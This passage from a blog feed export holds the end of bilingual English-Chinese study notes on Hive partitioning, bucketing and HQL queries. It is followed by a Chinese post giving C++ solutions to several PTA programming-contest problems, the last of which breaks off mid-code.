<span class="keyword">where</span> stat_date=<span class="string">'2001-01-02’;</span></span><br></pre></td></tr></table></figure></p><p>stat_date is called a static partition column, and province is called a dynamic partition column.<br>stat_date称为静态分区列，province称为动态分区列<br>In the select clause, dynamic partition columns need to be written in the order of partitioning, while static partition columns need not be written.<br>在select子句中，需要按分区顺序写入动态分区列，而不需要写入静态分区列。<br>In this way, all data with <code>stat_date = &#39;2001-01-02&#39;</code> will be inserted into <code>/user/hive/warehouse/logs_partition/stat_date=2001-01-02/</code> under different subfolders according to the difference of the source.<br>这样，根据来源的不同，所有<code>stat_date = &#39;2001-01-02&#39;</code>的数据将被插入到<code>/user/hive/warehouse/logs_partition/stat_date=2001-01-02/</code>的不同子文件夹中。<br>The province sub-partition corresponding to the data does not exist, it will be automatically created<br>对应的province子分区数据不存在，将会自动创建</p><p>Related parameters about dynamic partitioning:   动态分区相关参数:<br><code>hive.exec.dynamic.partition.mode</code>. This value defaults to strict, which means that all columns are not allowed to be dynamic. Set hive.exec .dynamic.partition.mode = nonstrict<br>动态分区允许所有分区的列都是动态分区的列，但是你首先必须设置一个参数<code>hive.exec.dynamic.partition.mode</code>。该值默认为strict，这意味着不允许所有列都是动态的。 <code>hive.exec .dynamic.partition.mode = nonstrict</code><br><code>hive.exec.max.dynamic.partitions.pernode (default value:100)</code>：The maximum number of partitions that each mapreduce job can create. If this number is exceeded, an error will be reported.<br><code>hive.exec.max.dynamic.partitions.pernode</code>:每个mapreduce作业可以创建的最大的分区数。如果超过这个数字，将会报告一个错误。<br><code>hive.exec.max.dynamic.partitions (Default value is 1000)</code>： The maximum number of all partitions allowed in a dml statement.<br><code>hive.exec.max.dynamic.partitions (Default value is 1000)</code>： dml语句中允许的所有分区的最大数。<br><code>hive.exec.max.created.files (The default value is 100,000)</code>: The maximum number of files allowed for all mapreduce jobs.<br><code>hive.exec.max.created.files (The default value is 100,000)</code>:所有mapreduce作业允许的最大文件数。</p><h3 id="Bucket-table"><a href="#Bucket-table" class="headerlink" title="Bucket table"></a>Bucket table</h3><ul><li>Hive can be further organized into buckets for each table (table or partition).<br>Hive可以进一步的组织到每个表(表或分区)的桶中。</li><li>Buckets are more fine-grained data range divisions.<br>桶(Buckets)是更细粒度的数据范围划分。</li><li>Hive is also an organization that buckets a certain column.<br>Hive也是一个存储特定列的组织。</li><li>Hive determines the bucket in which the record is stored by hashing column values ​​and dividing by the number of buckets.<br>Hive通过散列列值并除以桶(Bucket)的数量来确定存储记录的桶(Buckets) 。</li><li>There are two reasons to organize tables (or partitions) into buckets:<br>将表(或分区)组织到桶(Buckets)中有两个原因:<ul><li>Get higher query processing efficiency.   获得更高的查询处理效率。 </li><li>Buckets add extra structure to the table, which Hive can take advantage of when processing some queries. Specifically, joining two tables that have buckets divided on the same columns (including the joining columns) . 桶(Buckets)为表添加了额外的结构，Hive在处理某些查询时可以利用它。具体来说，连接两个具有相同列上分隔桶(Buckets)的表(包括连接列)。</li></ul></li><li>Make sampling more efficient.    提高采样效率。<br>When dealing with large-scale data sets, if you can test run a small amount of data in the data set during the development and modification of the query, it will bring a lot of convenience.<br>在处理大型数据集时，如果在查询的开发和修改过程中，能够在数据集中测试运行少量的数据，将会带来很大的方便。</li></ul><p>Bucketing syntax:  Bucketing语法：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> bucketed_user (<span class="keyword">id</span> <span class="built_in">INT</span>, <span class="keyword">name</span> <span class="keyword">STRING</span>)</span><br><span class="line">   CLUSTERED <span class="keyword">BY</span> (<span class="keyword">id</span>) SORTED <span class="keyword">BY</span>(<span class="keyword">id</span>) <span class="keyword">INTO</span> <span class="number">4</span> BUCKETS;</span><br></pre></td></tr></table></figure></p><ul><li>The CLUSTERED BY clause specifies the columns used to divide the bucket and the number of buckets to be divided.<br>CLUSTERED BY子句指定用于划分桶(Bucket)的列和要划分的桶(Buckets)的数量。</li><li>Optional Sorted by clause can be used to sort data inside bucket based on column specified.</li><li>Hive uses a hash of the value and divides the result by the number of buckets to get the remainder, which is id.hash ()% 4. The data is put into the bucket based on this result.<br>Hive使用hash值，并将结果除以桶(Buckets )的数量来得到剩余部分，即id.hash()% 4。根据这个结果将数据放入桶(Bucket )中。</li><li>To populate the bucket table with data, you need to set the hive.enforce.bucketing property to true. 要用数据填充桶表，你需要设置hive.enforce.bucketing属性设为真。</li></ul><p>Remember buckets are created in power of 2<br>桶的数量要是2的次方<br>1 bucket = 1 file = 1 reducer<br><code>mapred.reduce.tasks=64</code></p><p>Bucket table store data</p><ul><li>Sometimes partitioning is not suitable in that case create bucket.</li><li>Disadvantage of partition<ul><li>Partitions can increase as new values are inserted in column.</li><li>Partition with small size can degrade the performance.</li></ul></li><li>Advantage of bucket<ul><li>The number of buckets is fixed and there is no data fluctuation</li><li>The number of Reduces written to the bucket is fixed</li></ul></li></ul><h2 id="HQL"><a href="#HQL" class="headerlink" title="HQL"></a>HQL</h2><h3 id="SELECT-Command"><a href="#SELECT-Command" class="headerlink" title="SELECT Command"></a>SELECT Command</h3><p>Syntax<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [ALL | <span class="keyword">DISTINCT</span>] select_expr, select_expr, ...FROM  table_reference</span><br><span class="line">[<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> col_list [<span class="keyword">HAVING</span> condition]]</span><br><span class="line">[CLUSTER <span class="keyword">BY</span> col_list | [<span class="keyword">DISTRIBUTE</span> <span class="keyword">BY</span> col_list] [<span class="keyword">SORT</span> <span class="keyword">BY</span> | <span class="keyword">ORDER</span> <span class="keyword">BY</span> col_list]</span><br><span class="line">] [<span class="keyword">LIMIT</span> <span class="built_in">number</span>]</span><br></pre></td></tr></table></figure></p><ul><li>We can use <code>ALL</code> option to retrieve all records and <code>DISTINCT</code> options to retrieve all records except duplicate one.<br>我们可以使用ALL选项来检索所有记录，使用DISTINCT选项来检 索除重复记录之外的所有记录。</li><li>The default is <code>ALL</code> 默认值是ALL</li><li>Where condition is same as SQL and support <code>OR</code> and <code>AND</code> condition<br>Where 条件与SQL相同，支持 OR 和 AND 条件</li><li>0.9 version supports <code>BETWEEN</code>, <code>IN</code>, <code>NOT</code> IN but does not support <code>EXIST</code> and <code>NOT EXIST</code><br>0.9版本支持BETWEEN, IN, NOT IN，但不支持 EXIST 和 NOT EXIST</li><li><code>ORDER BY</code> clause sort the data globally and there is only one Reduce task<br>ORDER BY子句对数据进行全局排序，并且只有一个Reduce任务</li><li><code>SORT BY</code> sorts the data locally<br>SORT BY按本地数据排序</li><li>Limit can limit the number of records queried.<br>Limit可以限制查询记录的数量。</li><li>We can print the column name By 我们可以用以下打印列名<br><code>set hive.cli.print.header = true;</code></li><li>Queries that specify columns using regular expressions<br>使用正则表达式对指定列的查询<br><code>Select id,name,&#39;pv.*&#39; from log</code></li><li><code>WHERE</code> clause :  The where condition is a Boolean expression.<br>where条件是一个Boolean表达式</li></ul><p>Partition-based query   基于分区的查询</p><ul><li>Normally, a SELECT query scans all tables (except sampling).<br>通常来说，SELECT查询扫描所有表(抽样除外)。</li><li>If the table is created with the <code>PARTITIONED BY</code> clause, the query can be partitioned and pruned, and a part of the table is scanned according to the partition range specified by the query.<br>如果使用PARTITIONED BY子句创建表，则可以对查询进行分区和 修剪，并根据查询指定的分区范围扫描表的一部分。</li><li>Currently, Hive specifies partitions in the where clause or the ON clause of JOIN and will perform partition trimming.<br>目前，Hive在<code>JOIN</code>的<code>where</code>子句或<code>ON</code>子句中指定分区，并将执行 分区修剪。</li></ul><p>Limit statement</p><ul><li>The Limit statement limits the number of rows returned.<br>Limit语句限制返回的行数</li><li>Example : <code>select * from pv limit 3;</code></li></ul><p>Column alias   (列别名)</p><ul><li>Example : select userid as uid from pv; </li></ul><p>Nested select    (嵌套的选择)</p><ul><li>Hive statements support nested select statements.<br>Hive语句支持nested select语句</li></ul><p>Like and RLike</p><ul><li>Like is a standard SQL statement, and RLike is an extension of Hive. You can specify matching conditions through java regular expressions.<br>Like是一个标准的SQL语句，而RLike是Hive的扩展。可以通过java 正则表达式for指定匹配条件<br>Example:<br><code>Select name,address.street from employees where address.street RLIKE &#39;.*(A|B).*&#39;</code><br><code>Select name,address.street from employees where address.street LIKE &#39;R%&#39;</code></li></ul><p>Group by </p><ul><li>Group by is used with aggregate functions (avg, sum, min, max, count) to group results by one or more columns:<br>Group by与聚集函数一起使用，将结果按一个或多个列分组:<br>Example : <code>Select count(id) from t_pv group by id;</code></li></ul><p>HAVING clause<br><code>SELECT col1 FROM t1 GROUP BY col1 HAVING SUM(col2) &gt; 10</code><br><code>SELECT col1 FROM (SELECT col1, SUM(col2) AS col2sum FROM t1 GROUP BY col1) t2 WHERE t2.col2sum &gt; 1</code><br>(Both queries will give same output) （两个查询将给出相同的输出）</p><h3 id="Join-statement"><a href="#Join-statement" class="headerlink" title="Join statement"></a>Join statement</h3><p>支持 INNER JOIN, FULL JOIN, LEFT JOIN, RIGHT JOIN</p><p>Syntax<br>join_table:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table_reference JOIN table_factor [join_condition] </span><br><span class="line">| table_reference &#123;LEFT|RIGHT|FULL&#125; [OUTER] JOIN table_reference join_condition</span><br><span class="line">| table_reference LEFT SEMI JOIN table_reference join_condition</span><br></pre></td></tr></table></figure></p><p>table_reference:<br>    table_factor   | join_table<br>table_factor:<br>    tbl_name [alias]   | table_subquery alias   | ( table_references )<br>join_condition:<br>    ON equality_expression_r( AND equality_expression )* equality_expression:<br>    expression = expression</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>NIIT</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PTA部分题解</title>
      <link href="/blog/problem-pta/"/>
      <url>/blog/problem-pta/</url>
      
        <content type="html"><![CDATA[<p>什么？！我居然在老师上课的时候做题？<br>有一种必不可能一遍过的感觉…坑多</p><hr><h1 id="练习3-2016年天梯赛决赛题集"><a href="#练习3-2016年天梯赛决赛题集" class="headerlink" title="练习3-2016年天梯赛决赛题集"></a>练习3-2016年天梯赛决赛题集</h1><h2 id="7-1-正整数A-B-15分"><a href="#7-1-正整数A-B-15分" class="headerlink" title="7-1 正整数A+B (15分)"></a>7-1 正整数A+B (15分)</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>收入两个数字，输出和，如果数字不符合要求输出<code>?</code>，和也为<code>?</code></p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>这题坑好多..我服了<br>首先0不算正整数，范围为[1,1000]的意思不是只会有这个范围的数，而是这个范围的数才算合法<br>会有空字符串…<br>PTA ban了<code>gets</code>,要用<code>cin.getline</code></p><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1005</span>;</span><br><span class="line"><span class="keyword">char</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">toNum</span><span class="params">(<span class="keyword">char</span>* a, <span class="keyword">int</span> l)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;<span class="string">'9'</span> || a[i]&lt;<span class="string">'0'</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> x=x*<span class="number">10</span>+a[i]-<span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&gt;<span class="number">1000</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x==<span class="number">0</span>?<span class="number">-1</span>:x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>.getline(a, N);</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(a), n1, n2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) <span class="keyword">if</span>(a[i]==<span class="string">' '</span>) &#123;</span><br><span class="line">        n1 = toNum(a, i);</span><br><span class="line">        n2 = toNum(a+i+<span class="number">1</span>, l-i<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n1==<span class="number">-1</span> || n2==<span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(n1==<span class="number">-1</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">"?"</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; n1;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">" + "</span>;</span><br><span class="line">        <span class="keyword">if</span>(n2==<span class="number">-1</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">"?"</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; n2;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">" = ?"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; n1 &lt;&lt; <span class="string">" + "</span> &lt;&lt; n2 &lt;&lt; <span class="string">" = "</span> &lt;&lt; n1+n2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-2-I-Love-GPLT-5分"><a href="#7-2-I-Love-GPLT-5分" class="headerlink" title="7-2 I Love GPLT (5分)"></a>7-2 I Love GPLT (5分)</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>竖着输出<code>I Love GPLT</code></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[]=<span class="string">"I Love GPLT"</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) <span class="built_in">printf</span>(<span class="string">"%c\n"</span>, s[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-3-出租-20分"><a href="#7-3-出租-20分" class="headerlink" title="7-3 出租 (20分)"></a>7-3 出租 (20分)</h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>输入一个手机号，输出一个生成方式，如图所示，要求<code>arr</code>降序<br><img alt src="https://images.ptausercontent.com/187"></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> c[<span class="number">11</span>];</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">11</span>];</span><br><span class="line"><span class="keyword">int</span> idx[<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">11</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) c[a[i]-<span class="string">'0'</span>]++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">9</span>;i&gt;=<span class="number">0</span>;i--) <span class="keyword">if</span>(c[i]) arr[++arr[<span class="number">0</span>]]=i,idx[i]=arr[<span class="number">0</span>]<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"int[] arr = new int[]&#123;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=arr[<span class="number">0</span>]; i++)</span><br><span class="line">        <span class="keyword">if</span>(i==arr[<span class="number">0</span>]) <span class="built_in">cout</span> &lt;&lt; arr[i]; <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">","</span>; </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#125;;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"int[] index = new int[]&#123;"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;l; i++) </span><br><span class="line">        <span class="keyword">if</span>(i==l<span class="number">-1</span>) <span class="built_in">cout</span> &lt;&lt; idx[a[i]-<span class="string">'0'</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; idx[a[i]-<span class="string">'0'</span>] &lt;&lt; <span class="string">","</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"&#125;;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-4-判断素数-10分"><a href="#7-4-判断素数-10分" class="headerlink" title="7-4 判断素数 (10分)"></a>7-4 判断素数 (10分)</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>输入$N,N\leqslant 10$个小于$2^{31}$的数，判断素数</p><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>懒得写了，直接$\sqrt {N}$判断就行了</p><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><p>略</p><h2 id="7-5-是不是太胖了-5分"><a href="#7-5-是不是太胖了-5分" class="headerlink" title="7-5 是不是太胖了 (5分)"></a>7-5 是不是太胖了 (5分)</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>算数</p><h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>一行代码的事</p><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><p>略</p><h2 id="7-6-一帮一-15分"><a href="#7-6-一帮一-15分" class="headerlink" title="7-6 一帮一 (15分)"></a>7-6 一帮一 (15分)</h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><p>算数</p><h3 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h3><p>一行代码的事</p><h3 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h3><p>略</p><h2 id="7-7-到底是不是太胖了-10分"><a href="#7-7-到底是不是太胖了-10分" class="headerlink" title="7-7 到底是不是太胖了 (10分)"></a>7-7 到底是不是太胖了 (10分)</h2><h2 id="7-8-Left-pad-20分"><a href="#7-8-Left-pad-20分" class="headerlink" title="7-8 Left-pad (20分)"></a>7-8 Left-pad (20分)</h2><h2 id="7-9-红色警报-25分"><a href="#7-9-红色警报-25分" class="headerlink" title="7-9 红色警报 (25分)"></a>7-9 红色警报 (25分)</h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>给一个图，$N$个节点，$M$条边，其中有$K$个节点失去，问每个节点是否会改变连通性。$K\leqslant N\leqslant 500, M\leqslant 500$</p><h3 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h3><p>这题还可以做一下，倒序加点，用并查集维护连通性<br>注意连得时候要小连大这样有顺序一些…不然就能连出一个环…<br>这题好像正序暴力模拟也能做？</p><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 5005</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m, k, gmov;</span><br><span class="line"><span class="keyword">int</span> f[N], d[N], b[N], ra[N];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; g[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">// int find(int x) &#123; return f[x]=(f[x]==x?x:find(f[x])); &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t=x;</span><br><span class="line">    <span class="keyword">while</span>(f[x]!=x) &#123; x=f[x]; &#125;</span><br><span class="line">    <span class="keyword">return</span> f[t]=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uni</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx=find(x), fy=find(y);</span><br><span class="line">    <span class="keyword">if</span>(fx!=fy) &#123; </span><br><span class="line">        <span class="keyword">if</span>(fx&lt;fy) f[fy]=fx;</span><br><span class="line">        <span class="keyword">else</span> f[fx]=fy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=n; i++) f[i]=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=m; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        g[u].push_back(v);</span><br><span class="line">        g[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=k; i++) &#123; <span class="built_in">cin</span> &gt;&gt; d[i]; b[d[i]]=<span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++) <span class="keyword">if</span>(!b[i]) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;g[i].size(); j++) <span class="keyword">if</span>(!b[g[i][j]]) &#123;</span><br><span class="line">            uni(i, g[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        gmov=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k; i; i--) &#123;</span><br><span class="line">        <span class="keyword">int</span> x=d[i], y=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;g[x].size(); j++) <span class="keyword">if</span>(!b[g[x][j]]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(y==<span class="number">-1</span>) y=find(g[x][j]);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(y!=find(g[x][j])) ra[i]=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(y!=<span class="number">-1</span>) uni(x, y);</span><br><span class="line">        b[x]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=k; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(ra[i]) <span class="built_in">cout</span> &lt;&lt; <span class="string">"Red Alert: City "</span>&lt;&lt; d[i] &lt;&lt; <span class="string">" is lost!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"City "</span> &lt;&lt; d[i] &lt;&lt; <span class="string">" is lost."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    